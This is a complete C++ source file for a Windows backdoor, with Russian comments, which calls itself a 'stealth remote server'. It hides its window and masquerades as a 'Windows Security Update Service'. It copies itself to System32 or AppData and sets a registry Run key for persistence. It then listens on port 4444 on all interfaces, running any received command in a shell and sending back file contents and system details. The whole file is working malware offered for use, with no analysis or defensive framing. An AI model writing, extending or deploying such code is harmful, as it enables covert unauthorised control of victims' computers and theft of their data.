#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <thread>
#include <vector>
#include <cstdlib>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <shlobj.h>
#include <tlhelp32.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

class StealthRemoteServer {
private:
    SOCKET serverSocket;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    struct sockaddr_in clientAddr;
    int clientAddrLen;
    bool isRunning;
    std::string currentDir;
    
public:
    StealthRemoteServer() : isRunning(false), clientSocket(INVALID_SOCKET) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        
        // Получаем текущую директорию
        char dir[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, dir);
        currentDir = std::string(dir);
    }
    
    ~StealthRemoteServer() {
        cleanup();
        WSACleanup();
    }
    
    // Установка в автозагрузку
    bool installToStartup() {
        HKEY hKey;
        const char* keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        const char* valueName = "WindowsSecurityUpdate"; // Маскируемся под системный процесс
        
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        // Копируем файл в системную папку
        char systemPath[MAX_PATH];
        GetSystemDirectoryA(systemPath, MAX_PATH);
        std::string newPath = std::string(systemPath) + "\\winsecupd.exe";
        
        if (!CopyFileA(exePath, newPath.c_str(), FALSE)) {
            // Если не удалось скопировать в System32, копируем в AppData
            char appDataPath[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
            newPath = std::string(appDataPath) + "\\Microsoft\\Windows\\winsecupd.exe";
            
            // Создаем директорию если не существует
            std::string dirPath = std::string(appDataPath) + "\\Microsoft\\Windows";
            CreateDirectoryA(dirPath.c_str(), NULL);
            
            if (!CopyFileA(exePath, newPath.c_str(), FALSE)) {
                return false;
            }
        }
        
        // Добавляем в автозагрузку
        if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)newPath.c_str(), newPath.length() + 1);
            RegCloseKey(hKey);
            return true;
        }
        
        return false;
    }
    
    // Маскировка процесса
    void maskProcess() {
        // Скрываем консольное окно
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        
        // Устанавливаем приоритет как у системного процесса
        SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
        
        // Меняем заголовок окна
        SetConsoleTitleA("Windows Security Update Service");
    }
    
    bool startServer(int port, const std::string& bindIP = "0.0.0.0") {
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET) {
            return false;
        }
        
        // Разрешаем переиспользование адреса
        int opt = 1;
        setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
        
        serverAddr.sin_family = AF_INET;
        
        if (bindIP == "0.0.0.0") {
            serverAddr.sin_addr.s_addr = INADDR_ANY; // Слушаем на всех интерфейсах
        } else {
            inet_pton(AF_INET, bindIP.c_str(), &serverAddr.sin_addr);
        }
        
        serverAddr.sin_port = htons(port);
        
        if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            return false;
        }
        
        if (listen(serverSocket, 5) == SOCKET_ERROR) { // Увеличиваем очередь подключений
            return false;
        }
        
        isRunning = true;
        return true;
    }
    
    bool acceptClient() {
        clientAddrLen = sizeof(clientAddr);
        clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        
        if (clientSocket == INVALID_SOCKET) {
            return false;
        }
        
        // Устанавливаем таймаут для сокета
        int timeout = 30000; // 30 секунд
        setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(clientSocket, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
        
        return true;
    }
    
    void handleClient() {
        char buffer[8192];
        std::string welcomeMsg = "Windows Security Update Service v2.1\nConnection established\n";
        send(clientSocket, welcomeMsg.c_str(), welcomeMsg.length(), 0);
        
        while (isRunning) {
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived <= 0) {
                break;
            }
            
            buffer[bytesReceived] = '\0';
            std::string command(buffer);
            
            // Удаляем символы новой строки
            command.erase(command.find_last_not_of("\r\n") + 1);
            
            if (command == "exit" || command == "quit") {
                break;
            }
            
            std::string response = executeCommand(command);
            
            // Добавляем промпт в конце ответа
            response += "\n[" + getCurrentDirectory() + "]> ";
            
            send(clientSocket, response.c_str(), response.length(), 0);
        }
        
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
    }
    
    std::string executeCommand(const std::string& command) {
        if (command.empty()) {
            return "";
        }
        
        // Команда смены директории
        if (command.substr(0, 3) == "cd ") {
            std::string path = command.substr(3);
            if (path == "..") {
                size_t pos = currentDir.find_last_of("\\");
                if (pos != std::string::npos && pos > 2) {
                    currentDir = currentDir.substr(0, pos);
                }
            } else if (path.length() > 1 && path[1] == ':') {
                // Абсолютный путь
                currentDir = path;
            } else {
                // Относительный путь
                if (currentDir.back() != '\\') currentDir += "\\";
                currentDir += path;
            }
            
            if (SetCurrentDirectoryA(currentDir.c_str())) {
                char realPath[MAX_PATH];
                GetCurrentDirectoryA(MAX_PATH, realPath);
                currentDir = std::string(realPath);
                return "Directory changed to: " + currentDir;
            } else {
                return "Failed to change directory: " + path;
            }
        }
        
        // Команда получения текущей директории
        if (command == "pwd" || command == "cd") {
            return currentDir;
        }
        
        // Специальные команды
        if (command == "sysinfo") {
            return getSystemInfo();
        }
        
        if (command == "netstat") {
            return executeSystemCommand("netstat -an");
        }
        
        if (command == "tasklist") {
            return executeSystemCommand("tasklist /fo table");
        }
        
        if (command.substr(0, 8) == "download") {
            std::string filename = command.substr(9);
            return downloadFile(filename);
        }
        
        // Выполнение обычной системной команды
        return executeSystemCommand(command);
    }
    
    std::string executeSystemCommand(const std::string& command) {
        // Устанавливаем рабочую директорию
        SetCurrentDirectoryA(currentDir.c_str());
        
        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            return "Command execution failed";
        }
        
        std::string result;
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        _pclose(pipe);
        
        if (result.empty()) {
            result = "Command executed successfully (no output)";
        }
        
        return result;
    }
    
    std::string getSystemInfo() {
        std::string info = "=== System Information ===\n";
        
        // Имя компьютера
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        if (GetComputerNameA(computerName, &size)) {
            info += "Computer Name: " + std::string(computerName) + "\n";
        }
        
        // Имя пользователя
        char userName[256];
        size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            info += "User Name: " + std::string(userName) + "\n";
        }
        
        // Версия Windows
        info += "OS: " + executeSystemCommand("ver");
        
        // IP адреса
        info += "\n=== Network Information ===\n";
        info += executeSystemCommand("ipconfig");
        
        return info;
    }
    
    std::string downloadFile(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary);
        if (!file.is_open()) {
            return "Error: Cannot open file " + filename;
        }
        
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        file.close();
        
        return "File content (" + std::to_string(content.size()) + " bytes):\n" + content;
    }
    
    std::string getCurrentDirectory() {
        return currentDir;
    }
    
    void cleanup() {
        isRunning = false;
        if (clientSocket != INVALID_SOCKET) {
            closesocket(clientSocket);
        }
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
    }
    
    // Проверка, запущен ли уже процесс
    bool isAlreadyRunning() {
        HANDLE hMutex = CreateMutexA(NULL, TRUE, "WindowsSecurityUpdateMutex");
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            CloseHandle(hMutex);
            return true;
        }
        return false;
    }
};

int main(int argc, char* argv[]) {
    StealthRemoteServer server;
    
    // Проверяем, не запущен ли уже процесс
    if (server.isAlreadyRunning()) {
        return 0; // Тихо завершаемся
    }
    
    // Маскируем процесс
    server.maskProcess();
    
    // Устанавливаем в автозагрузку при первом запуске
    server.installToStartup();
    
    // Определяем порт (по умолчанию 4444)
    int port = 4444;
    if (argc > 1) {
        port = atoi(argv[1]);
    }
    
    // Запускаем сервер на всех интерфейсах для удаленного доступа
    if (!server.startServer(port, "0.0.0.0")) {
        return 1;
    }
    
    // Основной цикл сервера
    while (true) {
        if (server.acceptClient()) {
            // Обрабатываем клиента в отдельном потоке
            std::thread clientThread(&StealthRemoteServer::handleClient, &server);
            clientThread.detach();
        }
        Sleep(100); // Небольшая пауза
    }
    
    return 0;
}